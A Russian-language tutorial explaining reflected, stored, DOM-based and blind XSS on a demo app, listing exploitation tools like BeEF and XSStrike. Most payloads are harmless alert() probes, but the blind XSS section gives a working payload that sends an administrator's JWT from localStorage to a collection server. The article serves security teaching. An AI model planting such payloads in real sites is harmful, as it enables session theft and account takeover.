## Что такое XSS

**XSS** - это уязвимость, при которой в веб-страницу можно внедрить произвольный **JavaScript**-код. Этот код выполняется в браузере пользователя от его имени и может читать данные, отправлять запросы, получать доступ к cookie, подменять содержимое страницы. Если жертва - админ, то специалист может получить полный контроль над приложением.

К основным видам **XSS** относят:

- **Reflected XSS**
- **Stored XSS**
- **DOM-based XSS**
- **Blind XSS**

## Reflected XSS

**Reflected XSS** проявляется, когда веб-приложение принимает входящие параметры HTTP-запроса и немедленно выводит их в ответе без валидации. Специалист по анализу защищенности внедряет JavaScript-код, который выполняется в браузере жертвы в контексте уязвимого домена.

> Валидация - процесс проверки любых данных, поступающих от пользователя или внешней системы, на соответствие установленным правилам и формату.

Предпосылкой для возникновения **Reflected XSS** является наличие в веб-приложении механизма, принимающего пользовательский ввод, при котором введённое значение отражается в HTML-странице без какой-либо фильтрации. К примеру, специалист по анализу защищённости обнаруживает на странице уязвимый GET-параметр **q**. Затем он формирует ссылку с полезной нагрузкой в значении параметра `http://site.com/search?q=<img src=x onerror=alert(135)>`**. **
Когда пользователь переходит по ней, браузер отправляет запрос на сервер, получает страницу и вставляет содержимое параметра **q** непосредственно в HTML без проверки. Браузер интерпретирует полученный код, тег **&lt;img>** пытается загрузить изображение по несуществующему пути, что вызывает ошибку, и срабатывает атрибут **onerror**, который вызывает команду **alert(135)**.

### Пример

Рассмотрим уязвимость на простейшем веб-приложении.

Для того чтобы проэксплуатировать уязвимость составим полезную нагрузку, которая будет выполнена в браузере жертвы -`<img src=x onerror=alert(135)>`.

![](../../_images/inline-887-2.webp)

Введённое значение попало в HTML без обработки, и браузер выполнил его как код, а не показал как текст

## Stored XSS

**Stored XSS** возникает в тех местах веб-приложения, где пользовательский ввод сохраняется на сервере и впоследствии отображается другим пользователям без надлежащей фильтрации. Типичные примеры: комментарии к записям сохраняемые в базу данных. Чтобы заподозрить наличие **Stored XSS**, достаточно попытаться оставить в любом поле ввода обычный HTML-тег, например **&lt;h1>test&lt;/h1>**, и посмотреть, отобразится ли он как обычный текст или браузер интерпретирует его как HTML.

Рассмотрим ситуацию где, специалист по анализу защищенности оставляет на сайте отзыв, содержащий полезную нагрузку -` <img src=x onerror=alert(1)>`**. **Сервер сохраняет этот отзыв в базе данных без какой-либо фильтрации. Впоследствии любой пользователь открывает страницу с отзывами, и при рендеринге страницы браузер интерпретирует сохранённый HTML-контент, включая любые встроенные скрипты, что приводит к выполнению внедрённого кода.

![](../../_images/inline-887-3.webp)

Обычные комментарии отображаются. Теперь пробуем оставить комментарий для проверки уязвимости от имени Bob Miller - `<img src=x onerror=alert(1)>`

![](../../_images/inline-887-4.webp)

Как видим, браузер выполнил внедрённый скрипт. Если другой пользователь зайдёт в комментарии к фильму, то при загрузке страницы этот скрипт выполнится и у него.

## DOM-based XSS

В отличие от предыдущих видов, здесь полезная нагрузка вообще не доходит до сервера. Он не получает её и не возвращает в ответе, всё происходит на стороне браузера. Уязвимость возникает, когда клиентский JavaScript сам берёт пользовательские данные из ненадёжного источника (**URL**, **localStorage**) и небезопасно вставляет их в DOM. JavaScript на странице читает фрагмент **URL **и без проверки вставляет его в HTML через **innerHTML**. Специалист по анализу защищённости формирует ссылку, содержащую полезную нагрузку `http://site.com/#<img src=x onerror=alert(1)>`**. **Когда жертва открывает ссылку, браузер загружает страницу, а встроенный JavaScript извлекает значение из **location.hash**, то есть всё, что находится после символа **#**, и вставляет это значение в DOM. Браузер интерпретирует вставленный код как HTML и JavaScript-код выполняется.

Рассмотрим пример, в котором жертва переходит по специально сформированной специалистом по анализу защищенности ссылке - `http://site.com/#<img src=x onerror=alert(1)>`. Когда страница загружается, в ней выполняется JavaScript-код, который считывает **hash**. В данном случае **location.hash** возвращает строку `#<img src=x onerror=alert(1)>`. Поскольку разработчику сайта был нужен только текст после решётки, скрипт применяет метод **.slice(1)**, который отрезает первый символ, и в переменную **data **попадает полезная нагрузка. Далее этот код вставляет полученные данные в HTML-страницу с помощью свойства **innerHTML** - `document.getElementById('output').innerHTML = data`. Браузер, получив команду вставить такой HTML, выполняет внедренный код и на экране появляется всплывающее окно.

![](../../_images/inline-887-5.webp)

## Blind XSS

**Blind XSS** - это разновидность, при которой специалист по анализу защищённости не видит результат сразу, код выполняется на стороне пользователя с другой ролью. Рассмотрим случай, когда специалист внедряет на страницу полезную нагрузку `<img src=x onerror="new Image().src='http://localhost:9000/steal?jwt='+encodeURIComponent(localStorage.getItem('jwt'))">`

Как работает структура **img src=x onerror=**, мы уже знаем. JavaScript создаёт новое невидимое изображение в памяти браузера. Когда браузер пытается загрузить это изображение, он отправляет GET-запрос на адрес, указанный специалистом, - в данном случае на локальный сервер **http://localhost:9000/steal?jwt=**. В параметр запроса подставляется значение, извлечённое из локального хранилища браузера **localStorage.getItem('jwt')**. Функция **encodeURIComponent** кодирует специальные символы, чтобы URL оставался корректным и токен не разрушил структуру запроса. В итоге специалист смог скомпрометировать **JWT** и теперь может выдать себя за админа.

Вот пример того, как специалист оставляет жалобу с полезной нагрузкой

![](../../_images/inline-887-6.webp)

Внедренный скрипт срабатывает только тогда, когда администратор открывает страницу с жалобами. При загрузке страницы скрипт автоматически выполняется, после чего **JWT-токен** администратора отправляется на сервер специалиста.

![](../../_images/inline-887-7.webp)

## Последствия эксплуатации уязвимости

Успешная эксплуатация XSS открывает специалисту по анализу защищенности широкий спектр возможностей: от чтения конфиденциальных данных и кражи сессионных токенов или cookie до выполнения произвольных действий от имени жертвы. В случае компрометации администратора можно получить полный контроль над приложением, включая доступ к базе данных и изменение настроек системы. Таким образом, XSS представляет собой критическую уязвимость, ведущую к полной компрометации веб-ресурса.

## Инструменты, используемые атакующими для обнаружения и последующей эксплуатации Cross-site Scripting

- [**XSS Hunter**](https://github.com/mandatoryprogrammer/xsshunter-express) - это мощный инструмент, предназначенный для поиска и эксплуатации XSS-уязвимостей. Он позволяет злоумышленникам устанавливать специальные механизмы для отслеживания активности XSS-эксплойтов в реальном времени на целевых веб-страницах. Когда уязвимость XSS будет использована, **XSS Hunter** регистрирует информацию о том, как и когда атакующий код был выполнен, что предоставляет полезные данные для дальнейшего использования уязвимости
- [**BeEF**](https://github.com/beefproject/beef) - это фреймворк для эксплуатации уязвимостей браузеров, который может быть использован для тестирования XSS-уязвимостей. **BeEF** предоставляет злоумышленникам средства для внедрения вредоносных JavaScript-скриптов на страницы, посещаемые жертвами. Как только жертва активирует XSS-уязвимость, злоумышленник получает полный контроль над браузером жертвы и может выполнять различные атаки, включая кражу данных и внедрение вредоносного кода.
- [**XSSer**](https://www.kali.org/tools/xsser/) - это автоматизированный инструмент для сканирования и эксплуатации уязвимостей XSS. Он может быть использован как для поиска, так и для использования найденных уязвимостей, автоматически генерируя и отправляя различные полезные нагрузки, чтобы проверить, можно ли выполнить код на целевом сайте. **XSSer** поддерживает различные методы обхода фильтров и может работать с несколькими типами XSS, включая Reflected, Stored и DOM-based XSS.
- [**XSStrike**](https://github.com/s0md3v/xsstrike) - это продвинутый инструмент для сканирования и эксплуатации уязвимостей XSS, который включает в себя несколько полезных функций, таких как автоматическое обнаружение и обход фильтров, а также использование сложных техник для создания эффективных payload-ов. **XSStrike** поддерживает как традиционные методы атаки, так и более сложные подходы для обхода защитных механизмов, что делает его мощным инструментом для злоумышленников, работающих с XSS.
- [**XSS Exploitation Tool**](https://github.com/Sharpforce/XSS-Exploitation-Tool) - это инструмент, предназначенный для эксплуатации найденных уязвимостей XSS на веб-сайтах. Он позволяет злоумышленникам автоматически генерировать XSS-полезные нагрузки и запускать их на целевых веб-страницах. Этот инструмент используется для автоматизации XSS-атаки, делая процесс поиска и эксплуатации уязвимостей быстрым и эффективным. **XSS Exploitation Tool** может быть настроен на работу с несколькими типами инъекций, включая хранимые и отраженные XSS
- [**NucleiFuzzer**](http://github.com/0xKayala/NucleiFuzzer) - это инструмент, предназначенный для автоматизированного поиска уязвимостей, включая XSS, с использованием метода fuzzing
